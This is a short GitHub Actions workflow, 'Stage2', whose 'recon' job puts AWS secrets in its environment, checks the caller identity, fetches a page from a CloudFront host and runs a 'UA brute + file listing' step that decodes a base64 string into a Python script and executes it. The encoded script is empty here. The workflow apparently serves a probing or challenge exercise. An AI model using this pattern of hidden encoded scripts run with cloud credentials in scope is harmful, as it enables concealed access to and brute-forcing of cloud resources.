name: Stage2
on:
  push:
    branches:
      - corgi
permissions:
  contents: read

jobs:
  recon:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
      AWS_SESSION_TOKEN: ${{ secrets.AWS_SESSION_TOKEN }}
      AWS_DEFAULT_REGION: us-east-1
    steps:
      - name: Who am I
        run: aws sts get-caller-identity

      - name: Fetch docs.html
        run: curl -s https://d4ysu55xg7wfi.cloudfront.net/docs.html
        
      - name: Try UserAgents from Lambda
        run: |
          pip install requests requests-aws4auth --quiet
          
      - name: UA brute + file listing
        run: |
          pip install requests requests-aws4auth --quiet
          B64=''
          printf '%s' "$B64" | base64 -d > /tmp/ua2.py && python3 /tmp/ua2.py
